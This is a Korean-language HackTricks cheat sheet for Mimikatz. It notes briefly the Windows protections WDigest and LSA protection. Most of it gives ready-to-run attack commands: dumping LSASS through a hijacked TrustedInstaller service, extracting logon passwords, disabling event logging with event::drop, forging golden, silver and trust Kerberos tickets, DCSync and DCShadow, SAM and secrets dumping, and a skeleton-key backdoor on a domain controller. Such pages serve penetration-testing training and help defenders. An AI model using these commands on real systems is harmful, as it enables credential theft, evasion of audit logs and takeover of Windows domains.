# Mimikatz

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

* **사이버 보안 회사**에서 일하시나요? **회사를 HackTricks에서 광고**하거나 **PEASS의 최신 버전에 액세스**하거나 HackTricks를 **PDF로 다운로드**하고 싶으신가요? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인해보세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견해보세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter**에서 저를 **팔로우**하세요 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **해킹 트릭을 공유하려면 PR을** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **및** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **에 제출하세요.**

</details>

**이 페이지는 [adsecurity.org](https://adsecurity.org/?page\_id=1821)**를 기반으로 합니다. 자세한 내용은 원본을 확인하세요!

## 메모리에 저장된 LM 및 평문

Windows 8.1 및 Windows Server 2012 R2부터 자격 증명 도난을 방지하기 위해 중요한 조치가 적용되었습니다:

- **LM 해시 및 평문 암호**는 더 이상 보안을 강화하기 위해 메모리에 저장되지 않습니다. "평문" 암호가 LSASS에 캐시되지 않도록 하려면 특정 레지스트리 설정인 _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_을 DWORD 값 `0`으로 구성해야 합니다.

- **LSA 보호**는 로컬 보안 권한 (LSA) 프로세스를 무단으로 메모리 읽기 및 코드 삽입으로부터 보호하기 위해 도입되었습니다. 이는 LSASS를 보호된 프로세스로 표시함으로써 달성됩니다. LSA 보호의 활성화는 다음과 같은 단계를 거칩니다:
1. _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_에서 `RunAsPPL`을 `dword:00000001`로 설정하여 레지스트리를 수정합니다.
2. 이 레지스트리 변경을 관리되는 장치 전체에 적용하는 그룹 정책 개체 (GPO)를 구현합니다.

이러한 보호 조치에도 불구하고, Mimikatz와 같은 도구는 특정 드라이버를 사용하여 LSA 보호를 우회할 수 있지만, 이러한 작업은 이벤트 로그에 기록될 가능성이 있습니다.

### SeDebugPrivilege 제거에 대한 대응

일반적으로 관리자는 프로그램을 디버그할 수 있는 SeDebugPrivilege를 가지고 있습니다. 이 권한은 메모리 덤프를 추출하기 위해 공격자가 사용하는 일반적인 기술을 방지하기 위해 제한될 수 있습니다. 그러나 이 권한이 제거되더라도 TrustedInstaller 계정은 사용자 정의 서비스 구성을 사용하여 메모리 덤프를 수행할 수 있습니다:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
이를 통해 `lsass.exe` 메모리를 파일로 덤프하여 다른 시스템에서 분석하여 자격 증명을 추출할 수 있습니다:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz 옵션

Mimikatz에서 이벤트 로그 조작은 두 가지 주요 동작을 포함합니다: 이벤트 로그 삭제 및 이벤트 서비스 패치하여 새 이벤트 기록을 방지합니다. 아래는 이러한 동작을 수행하기 위한 명령어입니다:

#### 이벤트 로그 삭제

- **명령어**: 이 동작은 이벤트 로그를 삭제하여 악의적인 활동을 추적하기 어렵게 만듭니다.
- Mimikatz는 표준 문서에서 명령 줄을 통해 이벤트 로그를 직접 삭제하는 명령을 제공하지 않습니다. 그러나 이벤트 로그 조작은 일반적으로 PowerShell이나 Windows 이벤트 뷰어와 같은 시스템 도구나 스크립트를 사용하여 특정 로그를 지우는 것을 포함합니다.

#### 실험적 기능: 이벤트 서비스 패치

- **명령어**: `event::drop`
- 이 실험적인 명령은 이벤트 로깅 서비스의 동작을 수정하여 새 이벤트 기록을 방지합니다.
- 예시: `mimikatz "privilege::debug" "event::drop" exit`

- `privilege::debug` 명령은 Mimikatz가 시스템 서비스를 수정하기 위해 필요한 권한으로 작동하도록 보장합니다.
- `event::drop` 명령은 이벤트 로깅 서비스를 패치합니다.


### Kerberos 티켓 공격

### 골든 티켓 생성

골든 티켓은 도메인 전체 액세스 위장을 가능하게 합니다. 주요 명령어와 매개변수는 다음과 같습니다:

- 명령어: `kerberos::golden`
- 매개변수:
- `/domain`: 도메인 이름입니다.
- `/sid`: 도메인의 보안 식별자(SID)입니다.
- `/user`: 위장할 사용자 이름입니다.
- `/krbtgt`: 도메인의 KDC 서비스 계정의 NTLM 해시입니다.
- `/ptt`: 티켓을 직접 메모리에 주입합니다.
- `/ticket`: 나중에 사용하기 위해 티켓을 저장합니다.

예시:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### 실버 티켓 생성

실버 티켓은 특정 서비스에 대한 액세스 권한을 부여합니다. 주요 명령어와 매개변수는 다음과 같습니다:

- 명령어: 골든 티켓과 유사하지만 특정 서비스를 대상으로 합니다.
- 매개변수:
- `/service`: 대상 서비스 (예: cifs, http).
- 골든 티켓과 유사한 다른 매개변수.

예시:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### 신뢰 티켓 생성

신뢰 티켓은 신뢰 관계를 활용하여 도메인 간 리소스에 액세스하는 데 사용됩니다. 주요 명령어와 매개변수는 다음과 같습니다:

- 명령어: Golden Ticket과 유사하지만 신뢰 관계에 대한 것입니다.
- 매개변수:
- `/target`: 대상 도메인의 FQDN입니다.
- `/rc4`: 신뢰 계정의 NTLM 해시입니다.

예시:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### 추가 Kerberos 명령어

- **티켓 목록 보기**:
- 명령어: `kerberos::list`
- 현재 사용자 세션의 모든 Kerberos 티켓을 나열합니다.

- **캐시 전달**:
- 명령어: `kerberos::ptc`
- 캐시 파일에서 Kerberos 티켓을 주입합니다.
- 예시: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **티켓 전달**:
- 명령어: `kerberos::ptt`
- 다른 세션에서 Kerberos 티켓을 사용할 수 있게 합니다.
- 예시: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **티켓 제거**:
- 명령어: `kerberos::purge`
- 세션에서 모든 Kerberos 티켓을 제거합니다.
- 충돌을 피하기 위해 티켓 조작 명령어를 사용하기 전에 유용합니다.


### Active Directory 조작

- **DCShadow**: 임시로 기계를 AD 객체 조작을 위한 DC로 동작하게 만듭니다.
- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: DC를 모방하여 암호 데이터를 요청합니다.
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### 자격 취득

- **LSADUMP::LSA**: LSA에서 자격 증명을 추출합니다.
- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: 컴퓨터 계정의 암호 데이터를 사용하여 DC를 가장합니다.
- *원본 컨텍스트에서 NetSync에 대한 특정 명령어가 제공되지 않았습니다.*

- **LSADUMP::SAM**: 로컬 SAM 데이터베이스에 액세스합니다.
- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: 레지스트리에 저장된 비밀을 해독합니다.
- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: 사용자에 대한 새로운 NTLM 해시를 설정합니다.
- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: 신뢰 인증 정보를 검색합니다.
- `mimikatz "lsadump::trust" exit`

### 기타

- **MISC::Skeleton**: DC의 LSASS에 백도어를 주입합니다.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### 권한 상승

- **PRIVILEGE::Backup**: 백업 권한 획득합니다.
- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: 디버그 권한 획득합니다.
- `mimikatz "privilege::debug" exit`

### 자격 취득

- **SEKURLSA::LogonPasswords**: 로그인한 사용자의 자격 증명을 표시합니다.
- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: 메모리에서 Kerberos 티켓을 추출합니다.
- `mimikatz "sekurlsa::tickets /export" exit`

### SID 및 토큰 조작

- **SID::add/modify**: SID 및 SIDHistory 변경합니다.
- 추가: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- 수정: *원본 컨텍스트에서 수정에 대한 특정 명령어가 제공되지 않았습니다.*

- **TOKEN::Elevate**: 토큰을 가장합니다.
- `mimikatz "token::elevate /domainadmin" exit`

### 터미널 서비스

- **TS::MultiRDP**: 여러 RDP 세션을 허용합니다.
- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: TS/RDP 세션을 나열합니다.
- *원본 컨텍스트에서 TS::Sessions에 대한 특정 명령어가 제공되지 않았습니다.*

### 보관함

- Windows Vault에서 암호를 추출합니다.
- `mimikatz "vault::cred /patch" exit`


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>로부터 제로에서 영웅까지 AWS 해킹 배우기<strong>!</strong></summary>

* **사이버 보안 회사**에서 일하시나요? **회사를 HackTricks에서 광고**하거나 **PEASS의 최신 버전에 액세스**하거나 **HackTricks를 PDF로 다운로드**하고 싶으신가요? [**구독 플랜**](https://github.com/sponsors/carlospolop)을 확인해보세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견해보세요. 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter**에서 저를 **팔로우**하세요 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **해킹 트릭을 공유하려면** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **및** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud)에 PR을 제출하세요.

</details>
